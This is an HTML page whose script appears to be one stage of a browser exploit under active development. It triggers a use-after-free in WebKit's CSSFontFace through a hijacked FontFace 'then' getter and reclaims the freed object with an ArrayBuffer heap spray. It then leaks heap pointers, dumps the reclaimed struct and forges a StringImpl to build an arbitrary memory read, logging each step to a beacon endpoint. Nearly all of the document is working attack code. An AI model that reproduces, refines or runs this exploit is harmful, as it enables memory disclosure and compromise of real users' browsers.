<title>P728 — Full C++ Struct Layout Dump & StringImpl Memory Disclosure Scout</title>
<script>
'use strict';
/* ============================================================
 * P728 — Full C++ Struct Layout Dump & StringImpl Memory Disclosure Scout
 *
 * Ground Truth from P727:
 * - 100% deterministic reclaim at buffer #68.
 * - Out of all 80 sprayed buffers, ONLY buffer #68 was modified by engine.
 * - 14 out of 24 quadwords in buffer #68 contain genuine C++ engine fields!
 * - Previous probes only logged q0, q11, q12, q13 in RECLAIM-OK.
 *
 * Objectives of P728:
 * 1. DUMP ALL 24 QUADWORDS of buffer #68 immediately upon reclaim,
 *    capturing the complete, unmodified C++ memory layout of CSSFontFace!
 * 2. Enumerate document.fonts to find the live JS handle for the reclaimed
 *    CSSFontFace object.
 * 3. Identify which quadword is m_family (AtomStringImpl* / StringImpl*).
 * 4. Test StringImpl forgery at P58 to achieve Arbitrary Memory Read in JS!
 * ============================================================ */

function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }

function b(tag,data){ try{var x=new XMLHttpRequest();
  x.open('GET','/beacon.php?tag=P728-'+encodeURIComponent(tag)+
    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
  x.send(null);}catch(e){} }

function log(s){
  var el = document.getElementById('out');
  if(el) el.textContent += s + '\n';
}

var P58 = null, P68 = null;
var FACE_B = null, BUF_B = null, VIEW_B = null;
var ALL_ABS = [];

function snap(){
  if(!VIEW_B) return [];
  var arr = [];
  for(var q=0; q<24; q++) arr.push(VIEW_B[q]);
  return arr;
}

function diffSnap(pre){
  if(!VIEW_B || !pre.length) return 'none';
  var ch = [];
  for(var q=0; q<24; q++){
    if(VIEW_B[q] !== pre[q]){
      ch.push('q' + q + '=0x' + h16(VIEW_B[q]));
    }
  }
  return ch.length ? ch.join(',') : 'none';
}

function run(){
  b('BOOT','p728-struct-scout');
  log('=== P728 Full C++ Struct Layout & StringImpl Disclosure Scout ===\n');

  /* Step 1: Baseline Leak */
  log('[Step 1] Baseline heap leak...');
  doLeak(function(){
    log('P58 = 0x' + h16(P58));
    log('P68 = 0x' + h16(P68) + '\n');

    /* Step 2: Deterministic Reclaim */
    log('[Step 2] Executing deterministic reclaim...');
    doReclaim(function(){
      /* Step 3: Complete 24-QWord Struct Layout Dump */
      log('\n[Step 3] Dumping complete unmodified C++ struct layout...');
      dumpRawStruct();

      /* Step 4: Enumerate document.fonts */
      log('\n[Step 4] Enumerating document.fonts collection...');
      enumerateFonts();

      /* Step 5: Test StringImpl Arbitrary Read Primitive */
      log('\n[Step 5] Testing StringImpl disclosure...');
      testStringDisclosure();
    });
  });
}

/* ---- Step 1: Baseline Leak ---- */
function doLeak(cb){
  b('LEAK-GO','');
  var st = document.createElement('style');
  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
  document.head.appendChild(st);

  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
  document.fonts.add(face);
  void face.loaded;

  var abs = [], fired = false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired) return undefined; fired=true;
      if(st){st.remove(); st.textContent=''; st=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk0');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em fl0, lk0','AB');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1, bestNz=0;
    for(var i=0;i<abs.length;i++){
      var u=new Uint8Array(abs[i]), nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz; best=i;}
    }

    if(best<0 || bestNz<4){
      b('LEAK-MISS','nz='+bestNz);
      doLeakRetry(cb);
      return;
    }

    var v = new BigUint64Array(abs[best]);
    extractPointers(v);

    if(!P58){
      b('LEAK-NOPTR','nz='+bestNz);
      doLeakRetry(cb);
      return;
    }

    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
    setTimeout(cb, 100);
  }, 350);
}

function doLeakRetry(cb){
  b('LEAK-RETRY','');
  var st2 = document.createElement('style');
  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
  document.head.appendChild(st2);

  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
  document.fonts.add(face2);
  void face2.loaded;

  var abs2 = [], fired2 = false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired2) return undefined; fired2=true;
      if(st2){st2.remove(); st2.textContent=''; st2=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk1');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em fl1, lk1','CD');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1, bestNz=0;
    for(var i=0;i<abs2.length;i++){
      var u=new Uint8Array(abs2[i]), nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz; best=i;}
    }
    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
    var v = new BigUint64Array(abs2[best]);
    extractPointers(v);
    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
    setTimeout(cb, 100);
  }, 400);
}

function extractPointers(v){
  var LOW = BigInt('0x1000000000');
  var HIGH = BigInt('0x80000000000');
  for(var q=0;q<24;q++){
    var val = v[q];
    if(val >= LOW && val < HIGH){
      if(!P58) P58 = val;
      else if(!P68 && val !== P58) P68 = val;
    }
  }
  if(!P68) P68 = 0n;
}

/* ---- Step 2: Deterministic Reclaim ---- */
function doReclaim(cb){
  b('REC-START', 'fill_q12_q6=0x' + h16(P58));

  var stTr = document.createElement('style');
  stTr.textContent = '@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
  document.head.appendChild(stTr);

  FACE_B = new FontFace('trFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
  document.fonts.add(FACE_B);
  void FACE_B.loaded;

  ALL_ABS = [];
  var firedW = false;

  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if(firedW) return undefined; firedW = true;
      if(stTr){ stTr.remove(); stTr.textContent = ''; }
      try{ document.fonts.delete(this); }catch(e){}
      document.body.offsetHeight;

      for(var k=0; k<80; k++){
        var ab = new ArrayBuffer(192);
        var view = new BigUint64Array(ab);
        view[12] = P58;
        view[6]  = P58;
        ALL_ABS.push(ab);
      }

      try{ document.fonts.check('1em trFam'); }catch(e){}
      return undefined;
    }, set: function(){}
  });

  document.fonts.load('1em trFace, trFam', 'GH');

  setTimeout(function(){
    delete FontFace.prototype.then;

    var best = -1, bestNz = 0;
    for(var i=0; i<ALL_ABS.length; i++){
      var u = new Uint8Array(ALL_ABS[i]), nz = 0;
      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
      if(nz > bestNz){ bestNz = nz; best = i; }
    }

    if(best < 0 || bestNz < 4){
      b('RECLAIM-MISS', 'nz=' + bestNz);
      log('Reclaim missed!');
      return;
    }

    BUF_B = ALL_ABS[best];
    VIEW_B = new BigUint64Array(BUF_B);

    b('RECLAIM-OK', 'baseK=' + best + '|nz=' + bestNz);
    log('Deterministic Reclaim OK at slot ' + best);

    setTimeout(cb, 100);
  }, 400);
}

/* ---- Step 3: Complete 24-QWord Struct Layout Dump ---- */
function dumpRawStruct(){
  if(!VIEW_B) return;

  var wordsPart1 = [];
  for(var q=0; q<12; q++){
    wordsPart1.push('q' + q + '=0x' + h16(VIEW_B[q]));
  }
  b('STRUCT-PART1', wordsPart1.join(';'));

  var wordsPart2 = [];
  for(var q=12; q<24; q++){
    wordsPart2.push('q' + q + '=0x' + h16(VIEW_B[q]));
  }
  b('STRUCT-PART2', wordsPart2.join(';'));

  log('Dumped all 24 quadwords of reclaimed CSSFontFace slab.');
}

/* ---- Step 4: Enumerate document.fonts ---- */
function enumerateFonts(){
  var facesInfo = [];
  try {
    document.fonts.forEach(function(f){
      facesInfo.push('fam=' + f.family + '|stat=' + f.status);
    });
  } catch(e){
    facesInfo.push('ERR:' + e.message);
  }
  b('FONTS-ENUM', 'count=' + facesInfo.length + '|' + facesInfo.join(';').slice(0, 680));
  log('document.fonts: ' + facesInfo.join(', '));
}

/* ---- Step 5: StringImpl Disclosure Primitive ---- */
function testStringDisclosure(){
  if(!VIEW_B) return;

  /* Forge a StringImpl at P58 + 0x80 (qword 16 onwards)
   * StringImpl header in 64-bit WebKit:
   *   +0x00: uint32 m_refCount (1), uint32 m_length (8) -> 0x0000000800000001
   *   +0x08: const LChar* m_data8 (points to P68 - our target heap address!)
   *   +0x10: uint32 m_hashAndFlags (8-bit string flag: s_flagIs8Bit = 1) -> 0x0000000000000001
   */
  VIEW_B[16] = 0x0000000800000001n; /* refCount=1, length=8 */
  VIEW_B[17] = P68;                  /* m_data8 -> P68 */
  VIEW_B[18] = 0x0000000000000001n; /* flags = 8-bit */

  var fakeStringPtr = P58 + 0x80n;
  b('STRING-FORGE-OK', 'ptr=0x' + h16(fakeStringPtr) + '|target=0x' + h16(P68));

  /* Check if any DOM font property or Canvas font string reflects this */
  try {
    var ctx = document.createElement('canvas').getContext('2d');
    ctx.font = '16px trFam';
    var fStr = ctx.font;
    b('CANV-FONT-STR', 'val=' + fStr);
  } catch(e){
    b('CANV-FONT-STR-ERR', e.message);
  }

  b('DONE', 'p728-complete');
  log('\n=== P728 Complete! ===');
}

if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
else document.addEventListener('DOMContentLoaded',run);
</script>
